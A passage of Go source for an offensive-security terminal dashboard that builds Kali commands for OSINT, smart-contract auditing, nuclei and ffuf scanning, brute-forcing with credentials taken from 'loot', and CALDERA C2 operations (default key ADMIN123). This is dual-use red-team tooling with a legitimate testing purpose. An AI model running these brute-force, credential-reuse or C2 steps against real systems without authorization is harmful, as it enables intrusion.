			KaliShell:   "find /artifacts/osint -maxdepth 3 -type f 2>/dev/null | sort",
		},
	}
	return append(m.customFireActions("osint"), actions...)
}

func (m model) onchainFireActions() []controlAction {
	target := strings.TrimSpace(m.onchainTargetInput)
	if target == "" {
		target = "0x0000000000000000000000000000000000000000"
	}
	targetQuoted := shellQuote(target)
	profile := m.selectedOnchainProfile()
	networkQuoted := shellQuote(profile.Key)
	rpcQuoted := shellQuote(profile.RPCURL)
	chainIDText := fmt.Sprintf("%d", profile.ChainID)
	actions := []controlAction{
		{
			Label:       "[ONCHAIN] Stack Check",
			Description: "Verify onchain analyzers and wrappers are callable in h3retik-kali.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"onchain-stack-check\"",
			KaliShell:   "onchain-stack-check",
		},
		{
			Label:       "[ONCHAIN] RPC Catalog (Public + Testnet)",
			Description: "Show built-in public RPC endpoints and chain IDs available in CTRL target mode.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"onchain-rpc-catalog\"",
			KaliShell:   "onchain-rpc-catalog",
		},
		{
			Label:       "[ONCHAIN] RPC Check (" + profile.Key + ")",
			Description: "Validate public RPC reachability and chain ID resolution.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"onchain-rpc-check " + networkQuoted + "\"",
			KaliShell:   "onchain-rpc-check " + networkQuoted,
		},
		{
			Label:       "[ONCHAIN] Address Flow + 4D Correlation",
			Description: "Fetch inflow/outflow signals and emit 4D correlation graph for the selected address.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"onchain-address-flow " + targetQuoted + " " + networkQuoted + " 50000\"",
			KaliShell:   "onchain-address-flow " + targetQuoted + " " + networkQuoted + " 50000",
		},
		{
			Label:       "[ONCHAIN] Slither Audit",
			Description: "Run static analysis with Slither against the selected target/repo/path.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"onchain-slither " + targetQuoted + "\"",
			KaliShell:   "onchain-slither " + targetQuoted,
		},
		{
			Label:       "[ONCHAIN] Mythril Scan",
			Description: "Run symbolic analysis with Mythril against selected target.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"onchain-mythril " + targetQuoted + "\"",
			KaliShell:   "onchain-mythril " + targetQuoted,
		},
		{
			Label:       "[ONCHAIN] Foundry Check",
			Description: "Run Foundry-based sanity checks in configured workspace.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"ONCHAIN_RPC_URL=" + rpcQuoted + " ONCHAIN_CHAIN_ID=" + shellQuote(chainIDText) + " onchain-foundry-check " + targetQuoted + " " + networkQuoted + "\"",
			KaliShell:   "ONCHAIN_RPC_URL=" + rpcQuoted + " ONCHAIN_CHAIN_ID=" + shellQuote(chainIDText) + " onchain-foundry-check " + targetQuoted + " " + networkQuoted,
		},
		{
			Label:       "[ONCHAIN] Echidna Fuzz",
			Description: "Run invariant fuzz harness with Echidna.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"onchain-echidna " + targetQuoted + "\"",
			KaliShell:   "onchain-echidna " + targetQuoted,
		},
		{
			Label:       "[ONCHAIN] Medusa Fuzz",
			Description: "Run Medusa fuzzing campaign if available.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"onchain-medusa " + targetQuoted + "\"",
			KaliShell:   "onchain-medusa " + targetQuoted,
		},
		{
			Label:       "[ONCHAIN] Halmos Check",
			Description: "Run Halmos symbolic test harness if available.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"onchain-halmos " + targetQuoted + "\"",
			KaliShell:   "onchain-halmos " + targetQuoted,
		},
		{
			Label:       "[ONCHAIN] Artifact Index",
			Description: "List collected onchain artifacts paths.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"find /artifacts/onchain -maxdepth 3 -type f 2>/dev/null | sort\"",
			KaliShell:   "find /artifacts/onchain -maxdepth 3 -type f 2>/dev/null | sort",
		},
	}
	return append(m.customFireActions("onchain"), actions...)
}

func (m model) historyActions() []controlAction {
	actions := []controlAction{
		{
			Label:       "Switch To Live Telemetry",
			Description: "Return dashboard to live telemetry files under telemetry/.",
			Mode:        "internal",
			Command:     "live",
		},
		{
			Label:       "Start New Campaign (Archive + Reset)",
			Description: "Archive current telemetry/artifacts, then reset live campaign data while preserving current target scope.",
			Mode:        "local",
			Command:     "python3 ./scripts/telemetryctl.py new-campaign",
			Args:        []string{"python3", "./scripts/telemetryctl.py", "new-campaign"},
		},
		{
			Label:       "Snapshot Current Telemetry",
			Description: "Persist current live telemetry into telemetry/runs for replay.",
			Mode:        "local",
			Command:     "python3 ./scripts/telemetryctl.py snapshot",
			Args:        []string{"python3", "./scripts/telemetryctl.py", "snapshot"},
		},
	}
	if len(m.replayRuns) == 0 {
		actions = append(actions, controlAction{
			Label:       "No Replay Runs Detected",
			Description: "Run observatory or pipeline once to create telemetry/runs snapshots.",
			Mode:        "internal",
			Command:     "noop",
		})
		return actions
	}
	selected := m.replayRuns[clamp(m.replayRunIdx, 0, len(m.replayRuns)-1)]
	actions = append(actions,
		controlAction{
			Label:       "Load Selected Replay Run",
			Description: "Switch dashboard to " + filepath.Base(selected),
			Mode:        "internal",
			Command:     "replay:selected",
		},
		controlAction{
			Label:       "Load Latest Replay Run",
			Description: "Switch dashboard to most recent telemetry run snapshot.",
			Mode:        "internal",
			Command:     "replay:latest",
		},
	)
	return actions
}

func (m *model) applyInternalAction(action controlAction) {
	if strings.HasPrefix(action.Command, "module:configure:") {
		moduleID := strings.TrimSpace(strings.TrimPrefix(action.Command, "module:configure:"))
		mod, ok := m.attackModuleByID(moduleID)
		if !ok {
			m.controlStatus = "module configure failed :: module not found"
			return
		}
		keys := make([]string, 0, len(mod.Inputs))
		for _, input := range mod.Inputs {
			if strings.TrimSpace(input.Key) != "" {
				keys = append(keys, strings.TrimSpace(input.Key))
			}
		}
		if len(keys) == 0 {
			m.controlStatus = "module has no inputs to configure"
			return
		}
		m.moduleInputModuleID = mod.ID
		m.moduleInputKeys = keys
		m.moduleInputIdx = 0
		m.manualTargetMode = true
		m.manualTargetKind = "module-input"
		currentKey := keys[0]
		defaultValue := ""
		firstInput := attackModuleInput{Key: currentKey}
		for _, input := range mod.Inputs {
			if strings.EqualFold(strings.TrimSpace(input.Key), currentKey) {
				firstInput = input
				defaultValue = strings.TrimSpace(input.DefaultValue)
				break
			}
		}
		stored := strings.TrimSpace(m.moduleInputValues[m.moduleInputStorageKey(mod.ID, currentKey)])
		if stored != "" {
			defaultValue = stored
		}
		m.manualTargetInput = defaultValue
		m.controlStatus = fmt.Sprintf("module input %d/%d :: %s", 1, len(keys), moduleInputDisplayLabel(firstInput))
		return
	}
	switch action.Command {
	case "target:manual-url":
		m.manualTargetMode = true
		m.manualTargetKind = "url"
		if strings.TrimSpace(m.manualTargetInput) == "" {
			if strings.TrimSpace(m.state.TargetURL) != "" {
				m.manualTargetInput = strings.TrimSpace(m.state.TargetURL)
			} else {
				m.manualTargetInput = defaultTargetSuggestion()
			}
		}
		m.controlStatus = "manual target input active :: type URL and press Enter (Esc cancels)"
	case "target:manual-kali-container":
		m.manualTargetMode = true
		m.manualTargetKind = "kali-container"
		m.manualTargetInput = kaliContainerName()
		m.controlStatus = "manual kali container input active :: type container and press Enter (Esc cancels)"
	case "target:manual-kali-image":
		m.manualTargetMode = true
		m.manualTargetKind = "kali-image"
		m.manualTargetInput = kaliImageName()
		m.controlStatus = "manual kali image input active :: type image tag and press Enter (Esc cancels)"
	case "target:manual-osint":
		m.manualTargetMode = true
		m.manualTargetKind = "osint"
		if strings.TrimSpace(m.osintTargetInput) != "" {
			m.manualTargetInput = strings.TrimSpace(m.osintTargetInput)
		} else if strings.TrimSpace(m.state.TargetURL) != "" {
			seed := strings.TrimSpace(targetHostFromURL(m.state.TargetURL))
			if seed == "" {
				seed = strings.TrimSpace(m.state.TargetURL)
			}
			m.manualTargetInput = seed
		} else {
			m.manualTargetInput = "example.com"
		}
		m.controlStatus = "manual OSINT input active :: type seed and press Enter (Esc cancels)"
	case "target:manual-onchain":
		m.manualTargetMode = true
		m.manualTargetKind = "onchain"
		if strings.TrimSpace(m.onchainTargetInput) != "" {
			m.manualTargetInput = strings.TrimSpace(m.onchainTargetInput)
		} else {
			m.manualTargetInput = "0x0000000000000000000000000000000000000000"
		}
		m.controlStatus = "manual ONCHAIN input active :: type target and press Enter (Esc cancels)"
	case "target:manual-coop-url":
		m.manualTargetMode = true
		m.manualTargetKind = "coop-url"
		m.manualTargetInput = m.selectedCoopCalderaURL()
		m.controlStatus = "manual CO-OP caldera URL active :: type URL and press Enter (Esc cancels)"
	case "target:manual-coop-key":
		m.manualTargetMode = true
		m.manualTargetKind = "coop-key"
		m.manualTargetInput = m.selectedCoopCalderaAPIKey()
		m.controlStatus = "manual CO-OP API key active :: type key and press Enter (Esc cancels)"
	case "target:manual-coop-operation":
		m.manualTargetMode = true
		m.manualTargetKind = "coop-operation"
		m.manualTargetInput = m.selectedCoopOperationName()
		m.controlStatus = "manual CO-OP operation active :: type operation name and press Enter (Esc cancels)"
	case "target:manual-coop-agent-group":
		m.manualTargetMode = true
		m.manualTargetKind = "coop-agent-group"
		m.manualTargetInput = m.selectedCoopAgentGroup()
		m.controlStatus = "manual CO-OP agent group active :: type group and press Enter (Esc cancels)"
	case "target:inner:next":
		targets := exploitInnerTargets(findingsByMode(m.findings, "exploit"), lootByMode(m.loot, "exploit"), m.state.TargetURL)
		if len(targets) == 0 {
			m.controlStatus = "inner target map unavailable :: no endpoint telemetry yet"
			break
		}
		m.exploitInnerTargetIdx = clampWrap(m.exploitInnerTargetIdx+1, len(targets))
		selected := targets[m.exploitInnerTargetIdx]
		m.controlStatus = "ok :: inner target -> " + truncate(selected, 72)
	case "target:inner:prev":
		targets := exploitInnerTargets(findingsByMode(m.findings, "exploit"), lootByMode(m.loot, "exploit"), m.state.TargetURL)
		if len(targets) == 0 {
			m.controlStatus = "inner target map unavailable :: no endpoint telemetry yet"
			break
		}
		m.exploitInnerTargetIdx = clampWrap(m.exploitInnerTargetIdx-1, len(targets))
		selected := targets[m.exploitInnerTargetIdx]
		m.controlStatus = "ok :: inner target -> " + truncate(selected, 72)
	case "target:inner:manual":
		m.manualTargetMode = true
		m.manualTargetKind = "inner-target"
		current := strings.TrimSpace(m.selectedExploitInnerTarget())
		if current == "" {
			current = strings.TrimSpace(m.exploitActiveTarget)
		}
		if current == "" {
			current = strings.TrimSpace(m.state.TargetURL)
		}
		if current == "" {
			current = defaultTargetSuggestion()
		}
		m.manualTargetInput = current
		m.controlStatus = "manual inner target input active :: type endpoint/url and press Enter (Esc cancels)"
	case "target:inner:apply":
		selected := strings.TrimSpace(m.selectedExploitInnerTarget())
		if selected == "" {
			m.controlStatus = "inner target apply failed :: no mapped endpoint selected"
			break
		}
		m.exploitActiveTarget = selected
		m.controlStatus = "ok :: FIRE target override -> " + truncate(selected, 72)
	case "target:inner:clear":
		m.exploitActiveTarget = ""
		m.controlStatus = "ok :: FIRE target override cleared"
	case "target:osint-type:next":
		types := osintInputTypes()
		if len(types) > 0 {
			m.osintTargetTypeIdx = (m.osintTargetTypeIdx + 1) % len(types)
			m.controlStatus = "ok :: OSINT input type -> " + strings.ToUpper(m.selectedOsintInputType())
		}
	case "target:osint-type:prev":
		types := osintInputTypes()
		if len(types) > 0 {
			m.osintTargetTypeIdx = (m.osintTargetTypeIdx + len(types) - 1) % len(types)
			m.controlStatus = "ok :: OSINT input type -> " + strings.ToUpper(m.selectedOsintInputType())
		}
	case "target:osint-seed-from-url":
		seed := strings.TrimSpace(targetHostFromURL(m.state.TargetURL))
		if seed == "" {
			seed = strings.TrimSpace(m.state.TargetURL)
		}
		if seed == "" {
			m.controlStatus = "OSINT seed from URL failed :: no active target URL"
			break
		}
		m.osintTargetInput = seed
		m.controlStatus = "ok :: OSINT seed set from active target -> " + truncate(seed, 56)
	case "target:onchain-type:next":
		types := onchainInputTypes()
		if len(types) > 0 {
			m.onchainTargetTypeIdx = (m.onchainTargetTypeIdx + 1) % len(types)
			m.controlStatus = "ok :: ONCHAIN input type -> " + strings.ToUpper(m.selectedOnchainInputType())
		}
	case "target:onchain-type:prev":
		types := onchainInputTypes()
		if len(types) > 0 {
			m.onchainTargetTypeIdx = (m.onchainTargetTypeIdx + len(types) - 1) % len(types)
			m.controlStatus = "ok :: ONCHAIN input type -> " + strings.ToUpper(m.selectedOnchainInputType())
		}
	case "target:onchain-network:next":
		profiles := onchainNetworkProfiles()
		current := m.selectedOnchainProfile()
		idx := 0
		for i, profile := range profiles {
			if strings.EqualFold(profile.Key, current.Key) {
				idx = i
				break
			}
		}
		next := profiles[(idx+1)%len(profiles)]
		m.onchainNetworkInput = next.Key
		m.controlStatus = fmt.Sprintf("ok :: ONCHAIN network -> %s (%d)", next.Label, next.ChainID)
	case "target:onchain-network:prev":
		profiles := onchainNetworkProfiles()
		current := m.selectedOnchainProfile()
		idx := 0
		for i, profile := range profiles {
			if strings.EqualFold(profile.Key, current.Key) {
				idx = i
				break
			}
		}
		prev := profiles[(idx+len(profiles)-1)%len(profiles)]
		m.onchainNetworkInput = prev.Key
		m.controlStatus = fmt.Sprintf("ok :: ONCHAIN network -> %s (%d)", prev.Label, prev.ChainID)
	case "osint:deep:next":
		engines := osintDeepEngines()
		if len(engines) > 0 {
			m.osintDeepIdx = (m.osintDeepIdx + 1) % len(engines)
			m.controlStatus = "ok :: OSINT deep engine -> " + strings.ToUpper(m.selectedOsintDeepEngine())
		}
	case "osint:deep:prev":
		engines := osintDeepEngines()
		if len(engines) > 0 {
			m.osintDeepIdx = (m.osintDeepIdx + len(engines) - 1) % len(engines)
			m.controlStatus = "ok :: OSINT deep engine -> " + strings.ToUpper(m.selectedOsintDeepEngine())
		}
	case "fire:group:next":
		groups := exploitFireGroups()
		if len(groups) > 0 {
			m.exploitFireGroupIdx = (m.exploitFireGroupIdx + 1) % len(groups)
			m.exploitPipelineMenu = false
			m.fireIdx = 0
			m.controlStatus = "ok :: FIRE group -> " + strings.ToUpper(m.selectedExploitFireGroup())
		}
	case "fire:group:prev":
		groups := exploitFireGroups()
		if len(groups) > 0 {
			m.exploitFireGroupIdx = (m.exploitFireGroupIdx + len(groups) - 1) % len(groups)
			m.exploitPipelineMenu = false
			m.fireIdx = 0
			m.controlStatus = "ok :: FIRE group -> " + strings.ToUpper(m.selectedExploitFireGroup())
		}
	case "fire:pipelines:open":
		m.exploitPipelineMenu = true
		m.fireIdx = 0
		m.controlStatus = "ok :: pipeline selector opened"
	case "fire:pipelines:close":
		m.exploitPipelineMenu = false
		m.fireIdx = 0
		m.controlStatus = "ok :: back to fire options"
	case "fire:pipeline:next":
		names := pipelineNames()
		if len(names) > 0 {
			m.firePipelineIdx = (m.firePipelineIdx + 1) % len(names)
			m.controlStatus = "ok :: pipeline -> " + selectedPipelineLabel(m.selectedPipelineName())
		}
	case "fire:pipeline:prev":
		names := pipelineNames()
		if len(names) > 0 {
			m.firePipelineIdx = (m.firePipelineIdx + len(names) - 1) % len(names)
			m.controlStatus = "ok :: pipeline -> " + selectedPipelineLabel(m.selectedPipelineName())
		}
	case "custom:edit":
		m.manualTargetMode = true
		m.manualTargetKind = "custom-command"
		currentMode := strings.ToLower(strings.TrimSpace(m.fireMode))
		if currentMode == "" {
			currentMode = "exploit"
		}
		current := m.activeCustomCommand(currentMode)
		if strings.TrimSpace(current) == "" {
			current = m.defaultCustomCommand(currentMode)
		}
		m.manualTargetInput = current
		m.controlStatus = "manual custom command input active :: type command and press Enter (Esc cancels)"
	case "custom:runtime:next":
		if m.activeCustomRuntime() == "kali" {
			m.customCommandRuntime = "local"
		} else {
			m.customCommandRuntime = "kali"
		}
		m.controlStatus = "ok :: custom runtime -> " + strings.ToUpper(m.activeCustomRuntime())
	case "custom:runtime:prev":
		if m.activeCustomRuntime() == "kali" {
			m.customCommandRuntime = "local"
		} else {
			m.customCommandRuntime = "kali"
		}
		m.controlStatus = "ok :: custom runtime -> " + strings.ToUpper(m.activeCustomRuntime())
	case "custom:template:next":
		currentMode := strings.ToLower(strings.TrimSpace(m.fireMode))
		if currentMode == "" {
			currentMode = "exploit"
		}
		templates := m.customCommandTemplates(currentMode)
		if len(templates) > 0 {
			m.customTemplateIdx = (m.customTemplateIdx + 1) % len(templates)
			m.customCommandInput = templates[m.customTemplateIdx]
			m.controlStatus = "ok :: custom template loaded (" + strings.ToUpper(currentMode) + ")"
		}
	case "custom:template:prev":
		currentMode := strings.ToLower(strings.TrimSpace(m.fireMode))
		if currentMode == "" {
			currentMode = "exploit"
		}
		templates := m.customCommandTemplates(currentMode)
		if len(templates) > 0 {
			m.customTemplateIdx = (m.customTemplateIdx + len(templates) - 1) % len(templates)
			m.customCommandInput = templates[m.customTemplateIdx]
			m.controlStatus = "ok :: custom template loaded (" + strings.ToUpper(currentMode) + ")"
		}
	case "brute:cred-source:next":
		options := bruteCredentialSources()
		if len(options) > 0 {
			m.exploitBruteCredSrcIdx = clampWrap(m.exploitBruteCredSrcIdx+1, len(options))
			m.controlStatus = "ok :: brute cred source -> " + strings.ToUpper(m.selectedBruteCredentialSource())
		}
	case "brute:cred-source:prev":
		options := bruteCredentialSources()
		if len(options) > 0 {
			m.exploitBruteCredSrcIdx = clampWrap(m.exploitBruteCredSrcIdx-1, len(options))
			m.controlStatus = "ok :: brute cred source -> " + strings.ToUpper(m.selectedBruteCredentialSource())
		}
	case "brute:auth-mode:next":
		options := bruteAuthModes()
		if len(options) > 0 {
			m.exploitBruteAuthModeIdx = clampWrap(m.exploitBruteAuthModeIdx+1, len(options))
			m.controlStatus = "ok :: brute auth mode -> " + strings.ToUpper(m.selectedBruteAuthMode())
		}
	case "brute:auth-mode:prev":
		options := bruteAuthModes()
		if len(options) > 0 {
			m.exploitBruteAuthModeIdx = clampWrap(m.exploitBruteAuthModeIdx-1, len(options))
			m.controlStatus = "ok :: brute auth mode -> " + strings.ToUpper(m.selectedBruteAuthMode())
		}
	case "brute:loot-cred:next":
		pairs := extractCredentialPairsFromLoot(lootByMode(m.loot, "exploit"))
		if len(pairs) == 0 {
			m.controlStatus = "brute loot credential unavailable :: no credential pairs in loot"
			break
		}
		m.exploitBruteLootCredIdx = clampWrap(m.exploitBruteLootCredIdx+1, len(pairs))
		pair := pairs[m.exploitBruteLootCredIdx]
		m.controlStatus = "ok :: brute loot credential -> " + truncate(pair.User, 52)
	case "brute:loot-cred:prev":
		pairs := extractCredentialPairsFromLoot(lootByMode(m.loot, "exploit"))
		if len(pairs) == 0 {
			m.controlStatus = "brute loot credential unavailable :: no credential pairs in loot"
			break
		}
		m.exploitBruteLootCredIdx = clampWrap(m.exploitBruteLootCredIdx-1, len(pairs))
		pair := pairs[m.exploitBruteLootCredIdx]
		m.controlStatus = "ok :: brute loot credential -> " + truncate(pair.User, 52)
	case "brute:manual-cred":
		m.manualTargetMode = true
		m.manualTargetKind = "brute-manual-cred"
		user := strings.TrimSpace(m.exploitBruteManualUser)
		pass := strings.TrimSpace(m.exploitBruteManualPass)
		if user != "" || pass != "" {
			m.manualTargetInput = user + ":" + pass
		} else {
			m.manualTargetInput = "user@example.com:password123"
		}
		m.controlStatus = "manual brute credential input active :: format user:pass"
	case "brute:manual-token":
		m.manualTargetMode = true
		m.manualTargetKind = "brute-manual-token"
		m.manualTargetInput = strings.TrimSpace(m.exploitBruteManualToken)
		m.controlStatus = "manual brute token input active :: paste token and press Enter"
	case "live":
		m.telemetryDir = detectTelemetryDir(m.root)
		m.reload()
		m.controlStatus = "ok :: switched to live telemetry"
	case "replay:selected":
		if len(m.replayRuns) == 0 {
			m.controlStatus = "no replay runs available"
			return
		}
		path := m.replayRuns[clamp(m.replayRunIdx, 0, len(m.replayRuns)-1)]
		m.telemetryDir = path
		m.reload()
		m.controlStatus = "ok :: loaded " + filepath.Base(path)
	case "replay:latest":
		if len(m.replayRuns) == 0 {
			m.controlStatus = "no replay runs available"
			return
		}
		path := m.replayRuns[0]
		m.telemetryDir = path
		m.reload()
		m.controlStatus = "ok :: loaded latest run " + filepath.Base(path)
	case "coop:tutorial:show":
		m.controlStatus = "ok :: co-op guided quickstart loaded"
		m.controlOutput = strings.Join([]string{
			"CO-OP (CALDERA C2) QUICKSTART",
			"",
			"1) CTRL -> TARGET",
			"   - set CALDERA URL (default http://127.0.0.1:8888)",
			"   - set API key (default ADMIN123 in --insecure mode)",
			"   - set operation name and agent group",
			"",
			"2) CTRL -> FIRE",
			"   - Start CALDERA C2",
			"   - CALDERA Status",
			"   - List Agents",
			"   - List Operations",
			"   - Pull Operation Snapshot",
			"",
			"3) Evidence",
			"   - artifacts/coop/* captures co-op snapshots",
			"   - telemetry/commands.jsonl and telemetry/loot.jsonl track the run",
			"",
			"tips",
			"- use g to toggle CO-OP mode from CTRL",
			"- keep API key in env: COOP_CALDERA_API_KEY for safer reuse",
		}, "\n")
		m.controlLastLabel = action.Label
		m.controlLastCommand = action.Command
		m.controlDetailScroll = 0
	case "fire-mode:osint":
		m.fireMode = "osint"
		m.exploitPipelineMenu = false
		m.ensureCommandSelection()
		m.ensureFindingSelection()
		m.controlStatus = "ok :: FIRE mode switched to OSINT"
	case "fire-mode:onchain":
		m.fireMode = "onchain"
		m.exploitPipelineMenu = false
		m.ensureCommandSelection()
		m.ensureFindingSelection()
		m.controlStatus = "ok :: FIRE mode switched to ONCHAIN"
	case "fire-mode:exploit":
		m.fireMode = "exploit"
		m.exploitPipelineMenu = false
		m.ensureCommandSelection()
		m.ensureFindingSelection()
		m.controlStatus = "ok :: FIRE mode switched to EXPLOIT"
	case "fire-mode:coop":
		m.fireMode = "coop"
		m.exploitPipelineMenu = false
		m.ensureCommandSelection()
		m.ensureFindingSelection()
		m.controlStatus = "ok :: FIRE mode switched to CO-OP"
	default:
		m.controlStatus = "noop"
	}
	if !strings.EqualFold(strings.TrimSpace(action.Command), "coop:tutorial:show") {
		m.controlOutput = ""
	}
	m.controlLastLabel = action.Label
	m.controlLastCommand = action.Command
	m.controlDetailScroll = 0
}

func normalizeTargetURL(raw string) string {
	value := strings.TrimSpace(raw)
	if value == "" {
		return ""
	}
	if !strings.Contains(value, "://") {
		value = "http://" + value
	}
	return value
}

func normalizeOSINTInput(raw string) string {
	return strings.TrimSpace(raw)
}

func normalizeCustomCommand(raw string) string {
	return strings.TrimSpace(raw)
}

func (m model) activeCustomRuntime() string {
	switch strings.ToLower(strings.TrimSpace(m.customCommandRuntime)) {
	case "local":
		return "local"
	default:
		return "kali"
	}
}

func (m model) customCommandTemplates(mode string) []string {
	baseURL := strings.TrimSpace(m.effectiveExploitTargetURL())
	seed := strings.TrimSpace(m.osintTargetInput)
	if seed == "" {
		seed = targetHostFromURL(baseURL)
	}
	if seed == "" {
		seed = "example.com"
	}
	target := strings.TrimSpace(m.onchainTargetInput)
	if target == "" {
		target = "0x0000000000000000000000000000000000000000"
	}
	network := m.selectedOnchainProfile().Key
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "osint":
		return []string{
			"osint-seed-harvest " + shellQuote(seed) + " 200",
			"osint-deep-bbot " + shellQuote(seed),
			"osint-reconng " + shellQuote("modules load recon/domains-hosts/bing_domain_web; options set SOURCE "+shellQuote(seed)+"; run"),
			"find /artifacts/osint -maxdepth 3 -type f 2>/dev/null | sort",
		}
	case "onchain":
		return []string{
			"onchain-rpc-check " + shellQuote(network),
			"onchain-address-flow " + shellQuote(target) + " " + shellQuote(network) + " 50000",
			"onchain-slither " + shellQuote(target),
			"find /artifacts/onchain -maxdepth 3 -type f 2>/dev/null | sort",
		}
	case "coop":
		envPrefix := m.coopCalderaEnvPrefix()
		return []string{
			envPrefix + " coop-caldera-up",
			envPrefix + " coop-caldera-status",
			envPrefix + " coop-caldera-api /api/agents GET",
			envPrefix + " coop-caldera-api /api/operations GET",
			envPrefix + " coop-caldera-op-report",
			"find /artifacts/coop -maxdepth 3 -type f 2>/dev/null | sort",
		}
	default:
		if baseURL == "" {
			return []string{
				"echo 'set target url first from CTRL TARGET'",
			}
		}
		return []string{
			"curl -sSI " + shellQuote(baseURL),
			"nuclei -u " + shellQuote(baseURL) + " -silent",
			"ffuf -u " + shellQuote(strings.TrimRight(baseURL, "/")+"/FUZZ") + " -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403",
			"python3 ./scripts/security_pipeline.py --target " + shellQuote(baseURL) + " --profile quick",
		}
	}
}

func (m model) defaultCustomCommand(mode string) string {
	templates := m.customCommandTemplates(mode)
	if len(templates) == 0 {
		return ""
	}
	idx := clamp(m.customTemplateIdx, 0, len(templates)-1)
	return templates[idx]
}

func (m model) activeCustomCommand(mode string) string {
	custom := normalizeCustomCommand(m.customCommandInput)
	if custom != "" {
		return custom
	}
	return m.defaultCustomCommand(mode)
}

func shellQuote(raw string) string {
	if raw == "" {
		return "''"
	}
	return "'" + strings.ReplaceAll(raw, "'", `'"'"'`) + "'"
}

func (m *model) submitManualTarget() tea.Cmd {
	url := normalizeTargetURL(m.manualTargetInput)
	if url == "" {
		m.controlStatus = "manual target input is empty"
		return nil
	}
	m.manualTargetInput = url
	m.manualTargetMode = false
	m.controlBusy = true
	m.controlStatus = "running :: setting custom target to " + truncate(url, 56)
	m.controlOutput = ""
	m.controlDetailScroll = 0
	action := controlAction{
		Label:       "Set Target: Custom URL",
		Description: "Set a user-provided blackbox target URL.",
		Mode:        "local",
		Command:     "python3 ./scripts/targetctl.py set --kind custom --url " + url,
		Args:        []string{"python3", "./scripts/targetctl.py", "set", "--kind", "custom", "--url", url},
	}
	return controlCmd(m.root, action, "control-target")
}

func (m *model) submitManualOSINTTarget() tea.Cmd {
	seed := normalizeOSINTInput(m.manualTargetInput)
	if seed == "" {
		m.controlStatus = "manual OSINT input is empty"
		return nil
	}
	m.osintTargetInput = seed
	m.manualTargetMode = false
	m.controlStatus = "ok :: OSINT seed updated (" + strings.ToUpper(m.selectedOsintInputType()) + ") -> " + truncate(seed, 56)
	m.controlOutput = ""
	m.controlLastLabel = "Set OSINT Input: " + strings.ToUpper(m.selectedOsintInputType())
	m.controlLastCommand = seed
	m.controlDetailScroll = 0
	return nil
}

func (m *model) submitManualOnchainTarget() tea.Cmd {
	target := strings.TrimSpace(m.manualTargetInput)
	if target == "" {
		m.controlStatus = "manual ONCHAIN input is empty"
		return nil
	}
	m.onchainTargetInput = target
	m.manualTargetMode = false
	m.controlStatus = "ok :: ONCHAIN target updated (" + strings.ToUpper(m.selectedOnchainInputType()) + ") -> " + truncate(target, 56)
	m.controlOutput = ""
	m.controlLastLabel = "Set ONCHAIN Input: " + strings.ToUpper(m.selectedOnchainInputType())
	m.controlLastCommand = target
	m.controlDetailScroll = 0
	return nil
}

func (m *model) submitManualKaliContainer() tea.Cmd {
	value := strings.TrimSpace(m.manualTargetInput)
	if value == "" {
		m.controlStatus = "manual kali container is empty"
		return nil
	}
	prev := kaliContainerName()
	os.Setenv("H3RETIK_KALI_CONTAINER", value)
	clearKaliToolCache(prev)
	clearKaliToolCache(value)
	kaliStateMu.Lock()
	delete(kaliStateCache, prev)
	delete(kaliStateCache, value)
	kaliStateMu.Unlock()
	m.manualTargetMode = false
	m.controlStatus = "ok :: kali container -> " + truncate(value, 64)
	m.controlOutput = ""
	m.controlLastLabel = "Set Kali Container"
	m.controlLastCommand = value
	m.controlDetailScroll = 0
	return nil
}

func (m *model) submitManualKaliImage() tea.Cmd {
	value := strings.TrimSpace(m.manualTargetInput)
	if value == "" {
		m.controlStatus = "manual kali image is empty"
		return nil
	}
	os.Setenv("H3RETIK_KALI_IMAGE", value)
	m.manualTargetMode = false
	m.controlStatus = "ok :: kali image -> " + truncate(value, 64)
	m.controlOutput = ""
	m.controlLastLabel = "Set Kali Image"
	m.controlLastCommand = value
	m.controlDetailScroll = 0
	return nil
}

func (m *model) submitManualCoopCalderaURL() tea.Cmd {
	value := strings.TrimSpace(m.manualTargetInput)
	if value == "" {
		m.controlStatus = "manual CO-OP caldera URL is empty"
		return nil
	}
	if !strings.Contains(value, "://") {
		value = "http://" + value
	}
	m.coopCalderaURL = value
	m.manualTargetMode = false
	m.controlStatus = "ok :: CO-OP caldera URL -> " + truncate(value, 64)
	m.controlOutput = ""
	m.controlLastLabel = "Set CO-OP Caldera URL"
	m.controlLastCommand = value
	m.controlDetailScroll = 0
	return nil
}

func (m *model) submitManualCoopCalderaAPIKey() tea.Cmd {
	value := strings.TrimSpace(m.manualTargetInput)
	if value == "" {
		m.controlStatus = "manual CO-OP caldera API key is empty"
		return nil
	}
	m.coopCalderaAPIKey = value
	m.manualTargetMode = false
	m.controlStatus = "ok :: CO-OP caldera API key updated"
	m.controlOutput = ""
	m.controlLastLabel = "Set CO-OP Caldera API Key"
	m.controlLastCommand = truncate(value, 24)
	m.controlDetailScroll = 0
	return nil
}

func (m *model) submitManualCoopOperationName() tea.Cmd {
	value := strings.TrimSpace(m.manualTargetInput)
	if value == "" {
		m.controlStatus = "manual CO-OP operation name is empty"
		return nil
	}
	m.coopOperationName = value
	m.manualTargetMode = false
	m.controlStatus = "ok :: CO-OP operation -> " + truncate(value, 64)
	m.controlOutput = ""
	m.controlLastLabel = "Set CO-OP Operation Name"
	m.controlLastCommand = value
	m.controlDetailScroll = 0
	return nil
}

func (m *model) submitManualCoopAgentGroup() tea.Cmd {
	value := strings.TrimSpace(m.manualTargetInput)
	if value == "" {
		m.controlStatus = "manual CO-OP agent group is empty"
		return nil
	}
	m.coopAgentGroup = value
	m.manualTargetMode = false
	m.controlStatus = "ok :: CO-OP agent group -> " + truncate(value, 64)
	m.controlOutput = ""
	m.controlLastLabel = "Set CO-OP Agent Group"
	m.controlLastCommand = value
